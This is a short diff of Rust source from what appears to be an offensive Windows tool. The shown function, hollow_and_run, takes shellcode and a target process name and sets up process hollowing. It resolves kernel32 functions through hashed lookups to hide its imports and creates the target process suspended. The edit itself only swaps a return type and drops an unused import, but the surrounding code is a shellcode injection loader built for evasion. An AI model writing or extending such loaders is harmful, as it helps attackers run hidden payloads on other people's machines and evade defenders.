@@ -2,7 +2,7 @@ use core::ffi::c_void;
 use std::ptr;
 use windows::core::{PCSTR, PSTR};
 use windows::Wdk::System::Threading::PROCESSINFOCLASS;
-use windows::Win32::Foundation::{BOOL, HANDLE};
+use windows::Win32::Foundation::HANDLE;
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Threading::{
     CREATE_SUSPENDED, PROCESS_BASIC_INFORMATION, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
@@ -23,7 +23,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 18
     let function = rco_utils::find_function_address(kernel32, 0x6fe222ff0e96f5c4).unwrap();
-    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION]; [BOOL]);
+    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION]; [i32]);
     let lp_command_line = PSTR::from_raw(format!("{target_process}\0").as_mut_ptr());
     unsafe {
         let _ = function(
